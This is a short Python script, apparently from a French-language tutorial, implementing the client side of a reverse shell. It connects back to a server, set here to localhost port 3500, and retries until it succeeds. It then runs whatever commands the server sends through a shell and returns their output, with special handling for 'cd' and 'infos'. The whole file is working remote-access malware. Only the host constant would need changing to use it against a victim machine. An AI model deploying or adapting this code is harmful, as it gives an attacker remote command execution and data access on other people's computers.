
import socket
import time
import subprocess
import os
import platform

HOST_IP = "127.0.0.1"
HOST_PORT = 3500
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("Erreur : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break
    

while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode('ascii', errors='ignore')
    print("Commande : ", commande)
    
    commande_split = commande.split(" ")
    
    if commande == "infos":
        reponse = platform.platform() + " " + os.getcwd()
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1].strip("'"))
            reponse = " "
        except FileNotFoundError:
            reponse = "ERREUR : ce répertoire n'existe pas"
    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr
        
        if not reponse or len(reponse) == 0:
            reponse = " "  
    
    data_len = len(reponse.encode('ascii', errors='ignore'))
    header = str(data_len).zfill(13)
    #print("header:", header)
    s.sendall(header.encode('ascii', errors='ignore'))
    if data_len > 0:
        s.sendall(reponse.encode('ascii', errors='ignore'))
        
    
    
    
    
s.close()
         
         